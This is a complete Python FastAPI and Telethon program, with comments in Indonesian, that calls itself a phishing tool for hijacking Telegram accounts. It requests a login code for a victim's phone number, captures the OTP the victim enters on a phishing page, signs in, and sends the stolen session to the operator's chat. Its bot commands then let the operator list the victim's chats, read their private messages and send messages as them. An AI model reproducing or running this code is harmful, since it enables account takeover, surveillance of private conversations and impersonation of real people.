from fastapi import FastAPI, Request
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio
import os
import re

app = FastAPI()

# === ENV ===
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = int(os.getenv('CHAT_ID'))

client = TelegramClient('jinx', API_ID, API_HASH)
listening = {}
OTP_PATTERN = re.compile(r'\b(\d{5})\b')
sessions = {}

# === START ===
@app.on_event("startup")
async def startup():
    await client.start(bot_token=BOT_TOKEN)
    print("JINX BOT – ELITE EDITION JALAN!")

# === /start_listener – TANGKAP NOMOR KORBAN ===
@app.post("/start_listener")
async def start_listener(req: Request):
    data = await req.json()
    phone = data['phone']
    temp = TelegramClient(StringSession(), API_ID, API_HASH)
    await temp.connect()
    try:
        sent = await temp.send_code_request(phone)
        listening[phone] = {'client': temp, 'hash': sent.phone_code_hash}

        @temp.on(events.NewMessage(incoming=True, from_users=777000))
        async def handler(e):
            match = OTP_PATTERN.search(e.message.message)
            if match:
                await auto_login(phone, match.group(1), "interceptor")

        await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP dari web lo...")
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}

# === /submit_otp – KORBAN MASUKIN OTP ===
@app.post("/submit_otp")
async def submit_otp(req: Request):
    data = await req.json()
    phone = data['phone']
    otp = data['otp']
    if phone not in listening:
        return {"success": False, "error": "No active session"}
    temp = listening[phone]['client']
    hash_ = listening[phone]['hash']
    try:
        await temp.sign_in(phone, otp, phone_code_hash=hash_)
        session_str = temp.session.save()
        sessions[phone] = session_str
        await send_session(phone, session_str)
        await client.send_message(CHAT_ID, f"SESSION DICURI!\n/listchat {phone}")
        del listening[phone]
        return {"success": True}
    except Exception as e:
        await client.send_message(CHAT_ID, f"Gagal sign_in: {str(e)}")
        return {"success": False, "error": str(e)}

# === KIRIM SESSION KE BOT ===
async def send_session(phone, session_str):
    file_path = f"/tmp/{phone.replace('+','')}.session"
    with open(file_path, "w") as f:
        f.write(session_str)
    await client.send_file(CHAT_ID, file_path, caption=f"SESSION: `{phone}`\nGunakan `/listchat {phone}`")
    os.remove(file_path)

# === /list ===
@client.on(events.NewMessage(pattern=r'/list'))
async def list_cmd(event):
    if event.sender_id != CHAT_ID: return
    if not sessions:
        await event.reply("Nggak ada session!")
        return
    msg = f"*{len(sessions)} SESSION:*\n"
    for p in sessions:
        msg += f"• `{p}`\n"
    await event.reply(msg, parse_mode='markdown')

# === /listchat +6281xxx – LIHAT SEMUA CHAT KORBAN ===
@client.on(events.NewMessage(pattern=r'/listchat (\+\d+)'))
async def listchat_cmd(event):
    if event.sender_id != CHAT_ID: return
    phone = event.pattern_match.group(1)
    if phone not in sessions:
        await event.reply("Session nggak ada!")
        return
    session_str = sessions[phone]
    stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    try:
        await stolen.connect()
        await stolen.start()
        data = f"**DAFTAR CHAT `{phone}`**\n\n"
        async for dialog in stolen.iter_dialogs(limit=50):
            name = dialog.name or "Unknown"
            username = f"@{dialog.entity.username}" if hasattr(dialog.entity, 'username') and dialog.entity.username else ""
            chat_type = ""
            extra = ""
            if dialog.is_user:
                chat_type = "Private"
                status = "Online" if dialog.entity.status else "Last seen recently"
                extra = f"\n   ↳ {status}"
            elif dialog.is_group:
                chat_type = "Grup"
                members = getattr(dialog.entity, 'participants_count', 'Unknown')
                extra = f"\n   ↳ {members} anggota"
            elif dialog.is_channel:
                chat_type = "Channel"
                members = getattr(dialog.entity, 'participants_count', 'Unknown')
                extra = f"\n   ↳ {members} subscriber"
            data += f"{chat_type}\n"
            data += f"   **{name}** {username}{extra}\n\n"
        await event.reply(data if len(data) < 4000 else data[:3900] + "\n...\nGunakan `/chat` untuk detail", parse_mode='markdown')
        await stolen.disconnect()
    except Exception as e:
        await event.reply(f"Gagal: {str(e)}")

# === /chat +6281xxx @target – BACA CHAT 1 ORANG ===
@client.on(events.NewMessage(pattern=r'/chat (\+\d+) (@\w+|\d+)'))
async def chat_cmd(event):
    if event.sender_id != CHAT_ID: return
    phone = event.pattern_match.group(1)
    target = event.pattern_match.group(2)
    if phone not in sessions:
        await event.reply("Session nggak ada!")
        return
    session_str = sessions[phone]
    stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    try:
        await stolen.connect()
        await stolen.start()
        entity = await stolen.get_entity(target)
        name = entity.first_name or entity.title or "Unknown"
        data = f"**CHAT DENGAN `{target}`**\n"
        data += f"**Nama:** `{name}`\n\n"
        async for msg in stolen.iter_messages(entity, limit=10):
            sender = "You" if msg.outgoing else name
            text = msg.message or "[Media]"
            if len(text) > 200: text = text[:200] + "..."
            data += f"**{sender}:** {text}\n\n"
        await event.reply(data, parse_mode='markdown')
        await stolen.disconnect()
    except Exception as e:
        await event.reply(f"Gagal baca chat: {str(e)}")

# === /send +6281xxx @target Pesan ===
@client.on(events.NewMessage(pattern=r'/send (\+\d+) (@\w+|\d+) (.+)'))
async def send_cmd(event):
    if event.sender_id != CHAT_ID: return
    phone = event.pattern_match.group(1)
    target = event.pattern_match.group(2)
    message = event.pattern_match.group(3)
    if phone not in sessions:
        await event.reply("Session nggak ada!")
        return
    stolen = TelegramClient(StringSession(sessions[phone]), API_ID, API_HASH)
    try:
        await stolen.connect()
        await stolen.start()
        entity = await stolen.get_entity(target)
        await stolen.send_message(entity, message)
        await event.reply(f"Pesan terkirim ke `{target}` dari `{phone}`!")
        await stolen.disconnect()
    except Exception as e:
        await event.reply(f"Gagal kirim: {str(e)}")

# === /help ===
@client.on(events.NewMessage(pattern=r'/help'))
async def help_cmd(event):
    if event.sender_id != CHAT_ID: return
    await event.reply("""
**JINX BOT – ELITE EDITION**

**PHISHING:**
• Web lo → korban masukin nomor → OTP → session dicuri

**INTEL CHAT:**
• `/list` → Lihat session  
• `/listchat +6281xxx` → Lihat semua orang yang pernah di-chat  
• `/chat +6281xxx @target` → Baca chat 1 orang  
• `/send +6281xxx @target Pesan` → Kirim pesan  

**STATUS:** ONLINE | OWNER ONLY
""", parse_mode='markdown')
